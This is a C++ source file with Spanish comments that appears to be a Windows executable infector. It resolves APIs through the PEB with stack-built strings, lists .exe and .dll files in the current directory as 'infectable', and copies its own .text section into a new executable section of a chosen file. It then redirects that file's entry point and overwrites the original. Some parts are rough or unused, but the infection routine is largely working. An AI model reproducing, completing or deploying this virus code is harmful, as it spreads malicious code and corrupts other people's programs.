
#include "peb-lookup.h"
#include <string>
#include <sstream>
#include <iostream>
#include <fstream>
#include <string> // Asegúrate de incluir esto
#include <windows.h>
#include <vector>
#include <filesystem>
#include <windows.h>

#pragma pack(push, 1)

// Strings almacenados en la sección .text
#pragma code_seg(".text")




__declspec(allocate(".text"))
wchar_t kernel32_str[] = L"kernel32.dll";

__declspec(allocate(".text"))

#ifndef CUSTOM_ALIGN_UP
#define CUSTOM_ALIGN_UP(value, alignment) (((value) + ((alignment) - 1)) & ~((alignment) - 1))
#endif

char load_lib_str[] = "LoadLibraryA";


// Stack based strings for libraries and functions the shellcode needs
wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
char load_lib_name[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
char get_proc_name[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
char kr32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
char user32_dll_name[] = { 'u','s','e','r','3','2','.','d','l','l', 0 };
char ucrtbase_dll_name[] = { 'u','c','r','t','b','a','s','e','.','d','l','l' };
char message_box_name[] = { 'M','e','s','s','a','g','e','B','o','x','W', 0 };
char cf_name[] = { 'C','r','e','a','t','e','F','i','l','e','A', 0 };
char rf_name[] = { 'R','e','a','d','F','i','l','e', 0 };
char close_handle_name[] = { 'C','l','o','s','e','H','a','n','d','l','e', 0 };
char mb_to_wc_name[] = { 'M','u','l','t','i','B','y','t','e','T','o','W','i','d','e','C','h','a','r', 0 };
char strncmp_name[] = { 's','t','r','n','c','m','p', 0 };
char get_file_size_name[] = { 'G','e','t','F','i','l','e','S','i','z','e', 0 };
char map_view_of_file_name[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
char unmap_view_of_file_name[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
char create_file_mapping_name[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0 };
// stack based strings to be passed to the messagebox win api
wchar_t msg_content[] = { 'H','e','l','l','o', ' ', 'W','o','r','l','d','!', 0 };
wchar_t msg_title[] = { 'D','e','m','o','!', 0 };
char  fileName[] = { 'c', '-', 's','h','e','l','l','c','o','d','e','.','e','x','e', 0 };
char  fileName_vic[] = { 'y', 'u', 's','k','o','v','i','c','.','e','x','e', 0 };
// Nombre de la función
char func_name[] = { 's','t','r','n','c','m','p',0 };
// Read the file
const DWORD bufferSize = 64;
char buffer[bufferSize] = { 0 };
DWORD bytesRead;
wchar_t wide_buffer[bufferSize]; // Crear un buffer Unicode
// Definición del nombre de la función malloc
char malloc_name[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
// Definición del nombre de la función memcpy
char memcpy_name[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };

// Declarar las funciones globales
std::vector<std::string> FindInfectableFiles(const std::string& directory, const std::string& nameFilter, size_t sizeFilter);
HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);
FARPROC(WINAPI* _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
DWORD(WINAPI* _GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
LPVOID(WINAPI* _MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
BOOL(WINAPI* _UnmapViewOfFile)(LPCVOID lpBaseAddress);
HANDLE(WINAPI* _CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
BOOL(WINAPI* _ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
int(WINAPI* _MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
int(WINAPI* _MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
BOOL(WINAPI* _CloseHandle)(HANDLE hObject);
int(WINAPI* _strncmp)(const char* str1, const char* str2, size_t num);
errno_t(CDECL* _strcpy_s)(char* dest, size_t destsz, const char* src);
void(WINAPI* _ZeroMemory)(PVOID ptr, SIZE_T size);
DWORD(WINAPI* _SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
BOOL(WINAPI* _SetEndOfFile)(HANDLE hFile);
void* (WINAPI* _malloc)(size_t size);
void* (WINAPI* _memcpy)(void* dest, const void* src, size_t n);
HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
BOOL(WINAPI* _WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
void* (WINAPI* _memset)(void* dest, int value, size_t num);
BOOL(WINAPI* _FlushViewOfFile)(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush);
DWORD(WINAPI* _GetLastError)();  // Declarar GetLastError
// Declarar la función _GetModuleFileNameA
DWORD(WINAPI* _GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// Declarar la función _PrintError
void _PrintError(const char* errorMessage);
// Definir la función _PrintError

// Función para inicializar las funciones globales
bool InitializeFunctions() {
    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
    if (!base) return false;

    _LoadLibraryA = (HMODULE(WINAPI*)(LPCSTR)) get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
    _GetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
    if (!_LoadLibraryA || !_GetProcAddress) return false;

    HMODULE k32_dll = _LoadLibraryA(kr32_dll_name);
    HMODULE u32_dll = _LoadLibraryA(user32_dll_name);
    HMODULE hLibC = _LoadLibraryA(ucrtbase_dll_name);

    if (!k32_dll || !u32_dll || !hLibC) return false;
    _CreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)) _GetProcAddress(k32_dll, "CreateFileA");
    _GetFileSize = (DWORD(WINAPI*)(HANDLE, LPDWORD)) _GetProcAddress(k32_dll, get_file_size_name);
    _MapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T)) _GetProcAddress(k32_dll, map_view_of_file_name);
    _UnmapViewOfFile = (BOOL(WINAPI*)(LPCVOID)) _GetProcAddress(k32_dll, unmap_view_of_file_name);
    _CreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR)) _GetProcAddress(k32_dll, create_file_mapping_name);
    _ReadFile = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) _GetProcAddress(k32_dll, rf_name);
    _MessageBoxW = (int(WINAPI*)(HWND, LPCWSTR, LPCWSTR, UINT)) _GetProcAddress(u32_dll, message_box_name);
    _MultiByteToWideChar = (int(WINAPI*)(UINT, DWORD, LPCCH, int, LPWSTR, int)) _GetProcAddress(k32_dll, mb_to_wc_name);
    _CloseHandle = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress(k32_dll, close_handle_name);
    _strncmp = (int(WINAPI*)(const char*, const char*, size_t)) _GetProcAddress(hLibC, strncmp_name);
    _strcpy_s = (errno_t(CDECL*)(char*, size_t, const char*)) _GetProcAddress(hLibC, "strcpy_s");
    _ZeroMemory = (void(WINAPI*)(PVOID, SIZE_T)) _GetProcAddress(k32_dll, "ZeroMemory");

    _SetFilePointer = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD)) _GetProcAddress(k32_dll, "SetFilePointer");
    _SetEndOfFile = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress(k32_dll, "SetEndOfFile");
    _malloc = (void* (WINAPI*)(size_t)) _GetProcAddress(hLibC, malloc_name);
    _memcpy = (void* (WINAPI*)(void*, const void*, size_t)) _GetProcAddress(hLibC, memcpy_name);

    // Inicializar WriteFile, FlushViewOfFile y memset
    _WriteFile = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)) _GetProcAddress(k32_dll, "WriteFile");
    _FlushViewOfFile = (BOOL(WINAPI*)(LPCVOID, SIZE_T)) _GetProcAddress(k32_dll, "FlushViewOfFile");
    _memset = (void* (WINAPI*)(void*, int, size_t))_GetProcAddress(hLibC, "memset");

    // Inicializar GetLastError
    _GetLastError = (DWORD(WINAPI*)()) _GetProcAddress(k32_dll, "GetLastError");

    // Inicialización de _GetModuleFileNameA
    _GetModuleFileNameA = (DWORD(WINAPI*)(HMODULE, LPSTR, DWORD)) _GetProcAddress(k32_dll, "GetModuleFileNameA");

    return _GetFileSize && _MapViewOfFile && _UnmapViewOfFile && _CreateFileMappingA && _ReadFile && _MessageBoxW &&
        _MultiByteToWideChar && _CloseHandle && _strncmp && _strcpy_s && _ZeroMemory && _SetFilePointer &&
        _SetEndOfFile && _malloc && _memcpy && _CreateFileA && _WriteFile && _FlushViewOfFile && _memset && _GetLastError;
}
namespace fs = std::filesystem;
// Función auxiliar para verificar si una cadena termina con un sufijo
bool endsWith(const std::string& str, const std::string& suffix) {
    if (str.length() < suffix.length()) {
        return false;
    }
    return str.compare(str.length() - suffix.length(), suffix.length(), suffix) == 0;
}
void PrintOptionalHeader(const IMAGE_NT_HEADERS64& ntHeaders) {
    const IMAGE_OPTIONAL_HEADER64& optionalHeader = ntHeaders.OptionalHeader;
    // Imprimir otros campos si es necesario
}

void ModifyEntryPoint(IMAGE_NT_HEADERS64& ntHeaders, DWORD newEntryPointRVA);

struct PEHeader {
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_NT_HEADERS64 ntHeaders;
};

#pragma pack(pop)

void PrintError(const char* message) {
    std::cerr << message << std::endl;
    exit(EXIT_FAILURE);
}

DWORD GetTextSectionRVA(const std::string& filePath, DWORD& textSectionSize) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open file");
    }

    IMAGE_DOS_HEADER dosHeader;
    file.read(reinterpret_cast<char*>(&dosHeader), sizeof(IMAGE_DOS_HEADER));
    if (!file) {
        PrintError("Error reading DOS header");
    }

    file.seekg(dosHeader.e_lfanew, std::ios::beg);
    IMAGE_NT_HEADERS ntHeaders;
    file.read(reinterpret_cast<char*>(&ntHeaders), sizeof(IMAGE_NT_HEADERS));
    if (!file) {
        PrintError("Error reading PE header");
    }

    std::vector<IMAGE_SECTION_HEADER> sections(ntHeaders.FileHeader.NumberOfSections);
    file.read(reinterpret_cast<char*>(sections.data()), sizeof(IMAGE_SECTION_HEADER) * ntHeaders.FileHeader.NumberOfSections);
    if (!file) {
        PrintError("Error reading section headers");
    }

    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i) {
        if (strcmp(reinterpret_cast<const char*>(sections[i].Name), ".text") == 0) {
            textSectionSize = sections[i].Misc.VirtualSize;
            return sections[i].PointerToRawData; // Devuelve el offset físico en el archivo
        }
    }

    PrintError(".text section not found");
    return 0;
}

void InjectSelf(const std::string& victimFilePath, const std::string& outputFilePath, const char* selfCode, size_t selfCodeSize) {
    std::cout << "From InjectSelf: Victim file path is : " << victimFilePath
        << " Output file path is : " << outputFilePath
        << " Self-code size: " << selfCodeSize << std::endl;

    std::ifstream file(victimFilePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open victim file");
    }

    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> fileData(fileSize);
    file.read(fileData.data(), fileSize);
    if (!file) {
        PrintError("Error reading PE file");
    }

    IMAGE_DOS_HEADER dosHeader;
    std::memcpy(&dosHeader, fileData.data(), sizeof(IMAGE_DOS_HEADER));

    IMAGE_NT_HEADERS64 ntHeaders;
    std::memcpy(&ntHeaders, fileData.data() + dosHeader.e_lfanew, sizeof(IMAGE_NT_HEADERS64));

    IMAGE_FILE_HEADER& fileHeader = ntHeaders.FileHeader;
    IMAGE_OPTIONAL_HEADER64& optionalHeader = ntHeaders.OptionalHeader;
    IMAGE_SECTION_HEADER* sections = reinterpret_cast<IMAGE_SECTION_HEADER*>(fileData.data() + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    if (fileHeader.NumberOfSections < 1) {
        PrintError("Invalid PE file: No sections found");
    }

    IMAGE_SECTION_HEADER& lastSection = sections[fileHeader.NumberOfSections - 1];
    DWORD newSectionVirtualAddress = lastSection.VirtualAddress + ((lastSection.Misc.VirtualSize + optionalHeader.SectionAlignment - 1) & ~(optionalHeader.SectionAlignment - 1));
    DWORD newSectionPointerToRawData = lastSection.PointerToRawData + ((lastSection.SizeOfRawData + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));

    size_t newFileSize = newSectionPointerToRawData + ((selfCodeSize + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));
    fileData.resize(newFileSize);

    IMAGE_SECTION_HEADER newSection = {};
    strncpy_s(reinterpret_cast<char*>(newSection.Name), sizeof(newSection.Name), ".self", _TRUNCATE);
    newSection.Misc.VirtualSize = (selfCodeSize + optionalHeader.SectionAlignment - 1) & ~(optionalHeader.SectionAlignment - 1);
    newSection.VirtualAddress = newSectionVirtualAddress;
    newSection.SizeOfRawData = (selfCodeSize + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1);
    newSection.PointerToRawData = newSectionPointerToRawData;
    newSection.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;

    std::memcpy(fileData.data() + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64) + sizeof(IMAGE_SECTION_HEADER) * fileHeader.NumberOfSections, &newSection, sizeof(newSection));
    fileHeader.NumberOfSections++;
    optionalHeader.SizeOfImage = newSection.VirtualAddress + newSection.Misc.VirtualSize;

    DWORD sizeOfHeaders = dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64) + sizeof(IMAGE_SECTION_HEADER) * fileHeader.NumberOfSections;
    sizeOfHeaders = (sizeOfHeaders + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1);
    optionalHeader.SizeOfHeaders = sizeOfHeaders;

    std::memcpy(fileData.data() + newSection.PointerToRawData, selfCode, selfCodeSize);

    optionalHeader.AddressOfEntryPoint = newSection.VirtualAddress;

    std::memcpy(fileData.data() + dosHeader.e_lfanew, &ntHeaders, sizeof(IMAGE_NT_HEADERS64));
    std::memcpy(fileData.data(), &dosHeader, sizeof(IMAGE_DOS_HEADER));

    std::ofstream outFile(outputFilePath, std::ios::binary);
    if (!outFile) {
        PrintError("Cannot open output file");
    }
    outFile.write(fileData.data(), fileData.size());
    std::cout << "Self-code injected and entry point modified successfully." << std::endl;
}

std::vector<std::string> FindInfectableFiles(const std::string& directory, const std::string& nameFilter, size_t sizeFilter) {
    std::vector<std::string> infectableFiles;

    for (const auto& entry : std::filesystem::directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            const std::string& filePath = entry.path().string();
            const auto fileSize = entry.file_size();

            // Filtrar por extensión, nombre y tamaño
            if ((endsWith(filePath, ".exe") || endsWith(filePath, ".dll")) &&
                (nameFilter.empty() || filePath.find(nameFilter) != std::string::npos) &&
                (sizeFilter == 0 || fileSize <= sizeFilter)) {
                infectableFiles.push_back(filePath);
            }
        }
    }
    return infectableFiles;
}

void WriteReport(const std::vector<std::string>& files, const std::string& reportFilePath) {
    std::ofstream reportFile(reportFilePath);
    if (!reportFile) {
        PrintError("Cannot open report file");
    }

    for (const auto& file : files) {
        reportFile << file << std::endl;
    }

    reportFile.close();
    std::cout << "Report written to " << reportFilePath << std::endl;
}

int main(int argc, char* argv[]) {
    std::string nameFilter;
    size_t sizeFilter = 0;
    std::string reportFilePath = "report.txt"; // Ruta del archivo de reportes

    // Procesar argumentos
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-name" && (i + 1) < argc) {
            nameFilter = argv[++i];
        }
        else if (arg == "-size" && (i + 1) < argc) {
            sizeFilter = std::stoul(argv[++i]);
        }
    }

    // Obtener la ruta del directorio actual
    std::string currentDirectory = std::filesystem::current_path().string();
    std::cout << "Searching for infectable files in: " << currentDirectory << std::endl;

    // Buscar archivos infectables
    auto infectableFiles = FindInfectableFiles(currentDirectory, nameFilter, sizeFilter);
    if (infectableFiles.empty()) {
        std::cout << "No infectable files found in the current directory." << std::endl;
        return EXIT_SUCCESS;
    }

    // Escribir el reporte
    WriteReport(infectableFiles, reportFilePath);

    std::cout << "Infectable files found:" << std::endl;
    for (size_t i = 0; i < infectableFiles.size(); ++i) {
        std::cout << i + 1 << ": " << infectableFiles[i] << std::endl;
    }

    // Seleccionar un archivo para inyectar
    int choice;
    std::cout << "Select a file to infect (1-" << infectableFiles.size() << "): ";
    std::cin >> choice;

    if (choice < 1 || choice > infectableFiles.size()) {
        std::cerr << "Invalid choice." << std::endl;
        return EXIT_FAILURE;
    }

    std::string victimFilePath = infectableFiles[choice - 1];

    // Aquí puedes definir la ruta del archivo de salida
    std::string outputFilePath = victimFilePath; // Cambiar según necesites

    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    DWORD textSectionSize = 0;
    DWORD textSectionOffset = GetTextSectionRVA(selfPath, textSectionSize);

    std::ifstream selfFile(selfPath, std::ios::binary);
    if (!selfFile) {
        PrintError("Cannot open self file");
    }

    selfFile.seekg(textSectionOffset, std::ios::beg);
    std::vector<char> selfCode(textSectionSize);
    selfFile.read(selfCode.data(), textSectionSize);
    selfFile.close();

    InjectSelf(victimFilePath, outputFilePath, selfCode.data(), selfCode.size());

    system("pause");
    return 0;
}